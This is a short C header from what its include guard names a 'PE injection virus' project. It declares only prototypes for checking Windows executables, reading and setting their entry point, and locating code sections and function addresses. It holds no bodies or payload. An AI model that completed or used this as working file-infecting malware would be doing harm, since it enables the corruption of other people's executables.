#pragma once

#ifndef PEINJECTIONVIRUS_INCLUDE_PE_PE_H_
#define PEINJECTIONVIRUS_INCLUDE_PE_PE_H_

#include "ulti/everything.h"

BYTE WINAPI IsValidExeFile(const PVOID file_data);
BYTE WINAPI Is64BitExecutable(const PVOID file_data);

void SetEntryPoint(PVOID data, DWORD new_entry_point);
DWORD GetEntryPoint(PVOID data);

DWORD GetImageBase32(PVOID data);

PIMAGE_SECTION_HEADER GetCodeSectionOfEntryPoint(PVOID mem_data);
void GetFunctionAddresses(const PDATA data);

#endif